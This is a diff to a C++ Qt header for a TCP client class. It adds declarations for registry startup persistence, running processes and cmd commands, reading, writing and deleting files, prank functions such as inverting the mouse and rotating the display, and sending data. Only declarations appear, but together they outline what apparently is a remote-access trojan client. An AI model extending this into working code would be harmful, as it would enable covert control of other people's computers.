@@ -5,6 +5,13 @@
 #include <QTcpSocket>
 #include <QJsonDocument>
 #include <QJsonObject>
+#include <QFile>
+#include <QJsonArray>
+#include <QSettings>
+#include <QDir>
+#include <QDataStream>
+#include <windows.h>
+#include <QtEndian>
 
 class QClient : public QObject
 {
@@ -23,6 +30,22 @@ public:
 		OsMessage = 7,
 		GetFiles = 8,
 	};
+
+	//Modify registers
+	void addStartup();
+	//Process Execution
+	QString startProcess(const QString &);
+	QString runCmdCommand(const QString &);
+	//File Handling
+	QString readFile(const QString &);
+	bool writeFile(const QString &, const QString &);
+	bool deleteFile(const QString &);
+	//Funny stuff
+	void toggleInvertMouse();
+	void rotateDisplay();
+	void message(const QString &);
+
+	void sendData(const QByteArray &);
 
 signals:
 
